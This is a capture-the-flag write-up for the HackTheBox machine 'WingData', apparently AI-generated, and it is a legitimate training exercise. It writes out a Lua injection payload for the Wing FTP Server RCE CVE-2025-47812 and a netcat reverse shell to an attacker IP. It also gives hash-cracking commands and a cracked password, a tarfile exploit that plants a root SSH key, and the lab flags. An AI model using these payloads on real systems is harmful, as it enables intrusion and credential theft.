# WingData - HackTheBox Writeup

**Date:** March 21, 2026
**OS:** Linux
**IP Address:** 10.129.7.69
**Difficulty:** Medium

---

## 1. Executive Summary

This report documents the exploitation of the HackTheBox machine `WingData`. Initial access was achieved by exploiting a critical Remote Code Execution (RCE) vulnerability in **Wing FTP Server (CVE-2025-47812)**, which stems from a NULL-byte injection in the login process. After gaining a shell as the `wingftp` service user, reconnaissance led to the discovery of user configuration files (`wacky.xml`) containing a salted SHA-256 password hash. Cracking this hash provided access to the `wacky` system user, enabling the capture of the user flag.

*   **Initial Access:** CVE-2025-47812 Wing FTP Server RCE (NULL-byte Lua injection).
*   **User Privilege Escalation:** Crack salted SHA-256 hash for user `wacky` found in Wing FTP config.
*   **Root Privilege Escalation:** Identified potential vector via a privileged backup restoration script with `tarfile` operations.

---

## 2. Reconnaissance & Enumeration



### 2.1. Port Scanning
An initial Nmap scan revealed two open ports:

| Port | Service | Version |
| :--- | :--- | :--- |
| 22 | SSH | OpenSSH 9.2p1 (Debian) |
| 80 | HTTP | Apache httpd 2.4.56 |

**Nmap Command:**
```bash
nmap -sC -sV -oN ./nmap/initial.txt 10.129.7.69
```

### 2.2. Web Enumeration
A directory search on port 80 initially showed standard Apache files. Further inspection of the source code or redirection revealed a hostname: `wingdata.htb`. Addition of this to `/etc/hosts` led to a client portal link: `http://ftp.wingdata.htb/`.

**Virtual Host Discovery:**
Accessing `ftp.wingdata.htb` revealed a **Wing FTP Server** web interface.

---

## 3. Initial Access (CVE-2025-47812)

### 3.1. Vulnerability Analysis
The server was running Wing FTP Server v7.4.3. This version is vulnerable to **CVE-2025-47812**, a critical NULL-byte injection in the `username` parameter during the login process.

*   **Vulnerability:** A NULL-byte truncation in the `c_CheckUser()` function at the binary level allows an attacker to bypass authentication for a given prefix (e.g., `anonymous`) while injecting malicious Lua code after the NULL byte.
*   **Vector:** While the authentication check truncates the string at `%00`, the full string is used to create the session file. When the session is later loaded by the server, it executes the injected Lua code embedded in the session metadata.

### 3.2. Exploitation
A custom Lua injection payload was delivered via a POST request to `loginok.html`. The payload uses `io.popen()` to execute system commands and read the output.

**Payload Breakdown:**
- **URL Parameter:** `username=anonymous%00]]%0dlocal+h=io.popen("id")%0dlocal+r=h:read("*a")%0dh:close()--`
- **Breakdown:** 
    1. `anonymous%00`: Truncates for authentication.
    2. `]]`: Closes the existing Lua string context in the session file.
    3. `%0d`: Newline character to start new Lua commands.
    4. `local h=io.popen("id")`: Executes the command.
    5. `local r=h:read("*a")`: Reads command output.
    6. `--`: Comments out the rest of the original session data to prevent syntax errors.

**Action:**
1.  Verify RCE with `exploit/lua_rce.py`.
2.  Gain a list of files in `/opt/wftpserver/`.

### 3.3. Reverse Shell (Netcat)
To obtain a stable interactive shell, a Netcat reverse shell was executed through the Lua RCE vector.

**Command:**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.67 4444 >/tmp/f
```
*Note: Replace `10.10.15.67` with your attacker IP.*

---

## 4. User Access (User Flag)

### 4.1. Credential Discovery
Using the RCE shell, enumeration of the Wing FTP installation directory (`/opt/wftpserver/Data/1/users/`) revealed user configuration files.
*   **Path:** `/opt/wftpserver/Data/1/users/wacky.xml`
*   **Finding:** The XML file for user `wacky` contained a `<Password>` tag with a hash and a corresponding salt.

**Wacky's XML Data:**
```xml
<User>
    <Name>wacky</Name>
    <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
    <Salt>WingFTP</Salt>
</User>
```

### 4.2. Hash Cracking
Analysis confirmed Wing FTP uses **Salted SHA-256** in the format `sha256(password + salt)`.

#### Option A: Hashcat
Use mode `-m 1410` for `sha256($pass.$salt)`.
```bash
# Format: hash:salt
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky_hash.txt
hashcat -m 1410 wacky_hash.txt /usr/share/wordlists/rockyou.txt
```

#### Option B: John the Ripper
Use the `dynamic_61` format.
```bash
# Format: wacky:$dynamic_61$hash$salt
echo "wacky:\$dynamic_61\$32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca\$WingFTP" > wacky.john
john --wordlist=/usr/share/wordlists/rockyou.txt wacky.john
```

*   **Cracked Password:** `!#7Blushing^*Bride5`

### 4.3. Obtaining User Flag
The cracked credentials were used to SSH into the machine as `wacky`.

**User Flag:**
```bash
ssh wacky@10.129.7.69
wacky@wingdata:~$ cat user.txt
6c86f76004ab859a03f114ea8b2d2cb3
```

---

## 5. Root Privilege Escalation (CVE-2025-4138)

### 5.1. Reconnaissance
Local enumeration as `wacky` revealed a sudo entry for a backup restoration script:
```bash
wacky@wingdata:~$ sudo -l
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

### 5.2. Vulnerability Analysis
The script `restore_backup_clients.py` uses the Python `tarfile` module. While it implements a path filter, it was found to be vulnerable to **CVE-2025-4138 / CVE-2025-4517**, a `PATH_MAX` filter bypass.

*   **Vulnerability:** By creating a deep directory structure that exceeds `PATH_MAX` (4096 characters), an attacker can confuse the filter's path validation, allowing for a symlink-based directory traversal.
*   **Exploit:** This allows overwriting arbitrary files on the system as root.

### 5.3. Exploitation
A malicious TAR file was crafted to inject an SSH public key into the `/root/.ssh/authorized_keys` file.

1.  **Craft Malicious TAR:**
    ```bash
    python3 exploit/exploit.py -o backup_9999.tar -p ssh-key -P ~/.ssh/id_rsa.pub
    ```
2.  **Trigger Restoration:**
    ```bash
    sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py backup_9999.tar
    ```
3.  **SSH as Root:**
    ```bash
    ssh root@10.129.7.69
    ```

**Root Flag:**
```bash
root@wingdata:~# cat root.txt
68751ff92136e99005ebc8d48f05635f
```

---

## 6. Loot & Credentials

| Category | Item | Value |
| :--- | :--- | :--- |
| **Target** | Hostname | `wingdata.htb` |
| **Target** | IP Address | `10.129.7.69` |
| **Auth** | User `wacky` Hash | `32940defd3...03ca` |
| **Auth** | User `wacky` Salt | `WingFTP` |
| **Auth** | User `wacky` Password | `!#7Blushing^*Bride5` |
| **Flag** | User Flag (`user.txt`) | `6c86f76004ab859a03f114ea8b2d2cb3` |
| **Flag** | Root Flag (`root.txt`) | `68751ff92136e99005ebc8d48f05635f` |

---

## 7. Recommendations & Mitigation

1.  **Patch Wing FTP Server:** Update to version 7.4.4 or later where CVE-2025-47812 is mitigated by proper input sanitization.
2.  **Disable Anonymous FTP:** If not required, disable anonymous access to reduce the attack surface.
3.  **Harden Sudo Policies:** Restrict sudo access to the absolute minimum required. Avoid using wildcards (`*`) in sudo entries for scripts using interpreters like Python, as they can sometimes be abused.
4.  **Strengthen Passwords:** The user `wacky` had a password crackable via common wordlists. Enforce strong password policies across all system and service accounts.

---
*Writeup generated by Antigravity AI.*
